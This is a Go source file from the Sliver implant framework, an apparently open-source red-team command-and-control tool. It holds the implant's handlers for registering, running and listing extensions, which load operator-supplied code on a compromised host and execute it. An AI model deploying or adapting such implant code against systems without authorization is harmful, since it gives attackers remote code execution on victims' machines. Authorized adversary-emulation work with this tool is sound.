//go:build linux || darwin || windows

package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"github.com/bishopfox/sliver/implant/sliver/extension"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

type extensionFactory func(data []byte, id string, arch string, init string) extension.Extension

func registerExtensionHandler(data []byte, resp RPCResponse) {
	registerExtension(data, resp, newExtension)
}

func registerExtension(data []byte, resp RPCResponse, factory extensionFactory) {
	registerReq := &sliverpb.RegisterExtensionReq{}
	if err := proto.Unmarshal(data, registerReq); err != nil {
		return
	}

	ext := factory(registerReq.Data, registerReq.Name, registerReq.OS, registerReq.Init)
	err := extension.Register(ext)
	registerResp := &sliverpb.RegisterExtension{Response: &commonpb.Response{}}
	if err != nil {
		registerResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(registerResp)
	resp(data, err)
}

func callExtensionHandler(data []byte, resp RPCResponse) {
	callReq := &sliverpb.CallExtensionReq{}
	if err := proto.Unmarshal(data, callReq); err != nil {
		return
	}

	callResp := &sliverpb.CallExtension{Response: &commonpb.Response{}}
	gotOutput := false
	err := extension.Run(callReq.Name, callReq.Export, callReq.Args, func(out []byte) {
		gotOutput = true
		callResp.Output = out
		data, err := proto.Marshal(callResp)
		resp(data, err)
	})
	// Only send back synchronously if there was an error or no callback output.
	if err != nil || !gotOutput {
		if err != nil {
			callResp.Response.Err = err.Error()
		}
		data, err = proto.Marshal(callResp)
		resp(data, err)
	}
}

func listExtensionsHandler(data []byte, resp RPCResponse) {
	lstReq := &sliverpb.ListExtensionsReq{}
	if err := proto.Unmarshal(data, lstReq); err != nil {
		return
	}

	lstResp := &sliverpb.ListExtensions{
		Response: &commonpb.Response{},
		Names:    extension.List(),
	}
	data, err := proto.Marshal(lstResp)
	resp(data, err)
}
